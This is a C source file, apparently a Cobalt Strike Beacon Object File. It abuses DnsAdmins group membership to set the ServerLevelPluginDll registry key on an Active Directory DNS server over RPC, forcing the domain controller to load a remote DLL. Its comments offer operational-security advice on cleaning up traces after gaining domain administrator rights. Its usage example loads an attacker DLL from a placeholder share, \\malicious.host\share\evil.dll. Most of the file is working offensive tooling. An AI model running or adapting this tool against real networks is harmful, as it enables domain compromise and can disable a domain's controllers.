//
// dnsrpc_set_plugin_dll
//
// Used to force the ADIDNS server to load a DLL into memory by setting the `ServerLevelPluginDll` registry key via the RPC.
// Note that you still need to restart the service using `dnsrpc_restart_server`, and you must provide a valid 
// DLL with `DnsPluginInitialize`, `DnsPluginCleanup`, and `DnsPluginQuery` exports and should either execute very 
// quickly, or be executed in a new thread.
// 
// Warning: If the DC for whatever reason can't touch the DLL payload it will refuse to start back up and
// you'll likely cripple the entire domain, consider testing if the DC can connect back to your share using
// `dnsrpc_coerce_write`  before you accidentally nuke the target. 
//
// Operational security note: leaves a registry key "ServerLevelPluginDll" behind in
// `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters`. You'll need
// to clean this up once you get domain administrator rights. See: `dnsrpc_cleanup`
//
// Requires access to an account that is a member of the DnsAdmins group
//
// Further reading:
//   https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
//   https://www.semperis.com/blog/dnsadmins-revisited/
//   https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise
//   https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/9500a7e8-165d-4b13-be86-0ddc43100eef
//


#include "dnsrpc.h"

#include "beacon.h"
#include "beacon_dev.h"
#include "beacon_rpc.h"
#include "beacon_rpc.c"

#include "dnsrpc_c.c"

#ifndef _DEBUG
DECLSPEC_IMPORT HANDLE KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT LPVOID KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
DECLSPEC_IMPORT BOOL KERNEL32$HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
DECLSPEC_IMPORT INT WINAPI USER32$wsprintfW(LPWSTR, LPCWSTR, ...);
DECLSPEC_IMPORT VOID NTAPI NTDLL$RtlZeroMemory(PVOID, SIZE_T);
#else
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")
#endif

void usage() {
    BeaconPrintf(CALLBACK_ERROR, 
        "Usage: dnsrpc_set_plugin_dll <server> <dll path>\n"
        "Example: dnsrpc_set_plugin_dll DC01.research.lab \\\\malicious.host\\share\\evil.dll\n"
    );
}

#ifdef _DEBUG
void wmain(int argc, wchar_t *argv[]) 
{
    if (argc < 3) {
        usage();
        return;
    }

    WCHAR* server = argv[1];
    WCHAR* dll_path = argv[2];

#else

void go(PCHAR args, int alen) 
{
    datap parser;
    BeaconDataParse(&parser, args, alen);

    WCHAR* server = (WCHAR*)BeaconDataExtract(&parser, NULL);
    if (server == NULL) {
        usage();
        return;
    }

    WCHAR* dll_path = (WCHAR*)BeaconDataExtract(&parser, NULL);
    if (dll_path == NULL) {
        usage();
        return;
    }

#endif

    RPC_BINDING_HANDLE handle = dnsrpc_create_binding(server);
    if (!handle) {
        return;
    }

    DNSRPC_STATUS status = dnsrpc_set_plugin_dll(handle, server, dll_path);
    if (!DNSRPC_OK(status)) {
        if (DNSRPC_THREW(status)) {
            dnsrpc_print_exception(status.exception);
        } else {
            dnsrpc_print_exception(status.rpc_status);
        }
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Plugin dll set successfully.\n");

cleanup:
    if (handle != NULL) {
        RpcBindingFree(&handle);
    }

    return;
}

